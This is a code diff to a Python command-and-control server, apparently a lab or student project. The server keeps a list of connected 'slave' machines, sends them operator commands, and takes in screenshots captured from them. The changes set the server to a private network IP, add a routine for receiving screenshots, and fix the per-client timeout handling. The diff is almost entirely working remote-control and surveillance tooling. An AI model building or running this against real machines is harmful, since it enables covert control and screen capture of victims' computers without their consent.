@@ -9,13 +9,23 @@ import os
 # COMMAND AND CONTROL CODE WILL GO HERE
 
 port = 1234
-ip = '127.0.0.1'
+ip = '192.168.56.103'
 
 def removeSlave(slaves, ip):
     print(slaves)
     print(ip)
     sleep(30)
     slaves.remove(ip)
+
+def receiveImage(sock):
+    print("Receiving image...")
+    data = sock.recv(90920000)
+    print("received data")
+    file = open("./screenshot.png", 'wb')
+    file.write(data)
+    file.close()
+    sock.sendall(b"thx")
+    
 
 def runServer(sharedArray, slaves):
     slavetimeouts = dict()
@@ -34,19 +44,23 @@ def runServer(sharedArray, slaves):
                        + str(data))
                 command = bytearray(sharedArray)
                 sres.sendall(command)
-                if(command.decode('utf-8').split(" ")[0] == "screenshot"):
-                    byteforimage = sres.recv(40960000)
-                    image = Image.open(byteforimage)
-                    image.save("./screenshot.png")
+                decoded = command.decode('utf-8').split(" ")
+                if(decoded[0] == "screenshot" and decoded[1] == addr[0]):
+                    receiveImage(sres)
+                    img = Image.open("screenshot.png")
+                    img.show()
+                    sharedArray[:] = " ".encode("utf-8")
                 sres.close()
                 #Keep list of online slaves
                 if slaves.count(addr[0]) == 0:
                     slaves.append(addr[0])
                 #Set timeout for removal of slave from list
-                if addr[0] in slavetimeouts:
+                if addr[0] in slavetimeouts and slavetimeouts[addr[0]].is_alive():
                     os.kill(slavetimeouts[addr[0]].pid, SIGTERM)
                 slavetimeouts[addr[0]] = Process(target=removeSlave, args=(slaves, addr[0],))
                 slavetimeouts[addr[0]].start()
+        for key, process in slavetimeouts:
+            os.kill(process.pid, SIGTERM)
                     
 #Checks if an ip address is valid 
 def isValidIp(address):
@@ -84,7 +98,7 @@ if __name__ == "__main__":
                 #Convert to bytes for sending to slave
                 sharedArray[:] = command.encode('utf-8')
         elif currentSplit[0] == "screenshot":
-            if len(currentSplit) < 2 or not slaves.count(currentSplit[2]):
+            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
                 print("Invalid argument, should give target ip and target ip should be currently connected")
                 sharedArray.value = b""
             else:
